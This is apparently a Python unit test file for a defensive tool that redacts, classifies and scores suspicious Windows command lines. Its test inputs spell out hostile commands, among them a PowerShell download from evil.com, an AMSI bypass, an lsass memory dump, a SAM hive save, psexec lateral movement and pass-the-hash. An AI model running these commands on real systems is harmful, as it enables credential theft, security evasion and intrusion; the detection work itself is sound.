"""
Unit tests for analysis depth modules: classifier, parent_score, redactor.

No network or DB required — all pure-Python.
"""

from __future__ import annotations

import base64
import gzip

from app.classifier import classify
from app.parent_score import score_parent
from app.redactor import redact


# ---------------------------------------------------------------------------
# redactor
# ---------------------------------------------------------------------------


def test_redact_private_ip():
    cmd = "curl http://192.168.1.100/beacon"
    out, changed = redact(cmd)
    assert changed
    assert "[INTERNAL-IP]" in out
    assert "192.168.1.100" not in out


def test_redact_10_block():
    cmd = "net use \\\\10.0.0.5\\admin$ /user:domain\\user pass"
    out, changed = redact(cmd)
    assert changed
    assert "[INTERNAL-IP]" in out


def test_redact_172_block():
    cmd = "ping 172.16.100.1"
    out, changed = redact(cmd)
    assert changed
    assert "[INTERNAL-IP]" in out


def test_redact_credential_flag():
    cmd = "msbuild /p:password=SuperSecret123"
    out, changed = redact(cmd)
    assert changed
    assert "[REDACTED]" in out
    assert "SuperSecret123" not in out


def test_redact_ntlm_hash():
    cmd = "pass-the-hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
    out, changed = redact(cmd)
    assert changed
    assert "[NTLM-HASH]" in out


def test_redact_clean_command():
    cmd = "ls -la /tmp"
    out, changed = redact(cmd)
    assert not changed
    assert out == cmd


def test_redact_preserves_base64_blob():
    # Base64 encoded command should NOT be redacted
    b64 = base64.b64encode(b"Write-Host 'hello'").decode()
    cmd = f"powershell -EncodedCommand {b64}"
    out, changed = redact(cmd)
    assert not changed
    assert b64 in out


# ---------------------------------------------------------------------------
# classifier
# ---------------------------------------------------------------------------


def test_classify_dropper_iwr():
    cmd = "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://evil.com/a.exe','a.exe')\""
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "dropper" in names


def test_classify_loader_encodedcommand():
    b64 = base64.b64encode("IEX('calc')".encode("utf-16-le")).decode()
    cmd = f"powershell.exe -EncodedCommand {b64}"
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "loader" in names


def test_classify_defense_evasion_amsi():
    cmd = "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\""
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "defense_evasion" in names


def test_classify_credential_theft_lsass():
    cmd = 'procdump.exe -accepteula -ma lsass.exe lsass.dmp'
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "credential_theft" in names


def test_classify_persistence_schtasks():
    cmd = 'schtasks /create /tn "Updater" /tr "powershell -enc JAB..." /sc onlogon /ru system'
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "c2_persistence" in names


def test_classify_lateral_movement_psexec():
    cmd = "psexec \\\\192.168.1.50 -u domain\\admin -p pass cmd /c whoami"
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "lateral_movement" in names


def test_classify_recon():
    cmd = "cmd /c whoami && net user && ipconfig /all"
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "recon" in names


def test_classify_in_decoded_layer():
    # Credential theft indicator hidden in a decoded layer, not the outer command
    decoded_content = "reg save HKLM\\SAM C:\\Windows\\Temp\\s.hive"
    layers = [{"layer": 1, "encoding": "base64", "value": decoded_content}]
    cmd = f"powershell -enc {base64.b64encode(decoded_content.encode()).decode()}"
    classes = classify(cmd, layers)
    names = {c.name for c in classes}
    assert "credential_theft" in names


def test_classify_high_confidence_reported():
    cmd = "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
    classes = classify(cmd, [])
    theft = next((c for c in classes if c.name == "credential_theft"), None)
    assert theft is not None
    assert theft.confidence == "high"


def test_classify_benign_no_classes():
    cmd = "ls -la /tmp"
    classes = classify(cmd, [])
    # Benign ls should not trigger any high-confidence threat classes
    high_conf = [c for c in classes if c.confidence == "high"]
    assert high_conf == []


# ---------------------------------------------------------------------------
# parent_score
# ---------------------------------------------------------------------------


def test_parent_winword_powershell():
    verdict = score_parent("winword.exe", "powershell.exe -enc JAB...")
    assert verdict is not None
    assert verdict.suspicion == "high"
    assert verdict.parent == "winword.exe"
    assert verdict.child == "powershell.exe"


def test_parent_excel_cmd():
    verdict = score_parent("excel.exe", "cmd.exe /c calc")
    assert verdict is not None
    assert verdict.suspicion == "high"


def test_parent_chrome_powershell():
    verdict = score_parent("chrome.exe", "powershell -ep bypass -c iex(...)")
    assert verdict is not None
    assert verdict.suspicion == "high"


def test_parent_office_no_exe_suffix():
    # Should normalize missing .exe suffix
    verdict = score_parent("winword", "cmd /c whoami")
    assert verdict is not None
    assert verdict.suspicion == "high"


def test_parent_benign_explorer_cmd():
    verdict = score_parent("explorer.exe", "cmd.exe")
    assert verdict is not None
    assert verdict.suspicion == "benign"


def test_parent_low_suspicion_cmd_ps():
    verdict = score_parent("cmd.exe", "powershell.exe -NonInteractive")
    assert verdict is not None
    assert verdict.suspicion == "low"


def test_parent_unknown_pair_returns_none():
    verdict = score_parent("notepad.exe", "calc.exe")
    assert verdict is None


def test_parent_no_binary_in_command():
    verdict = score_parent("winword.exe", "")
    assert verdict is None
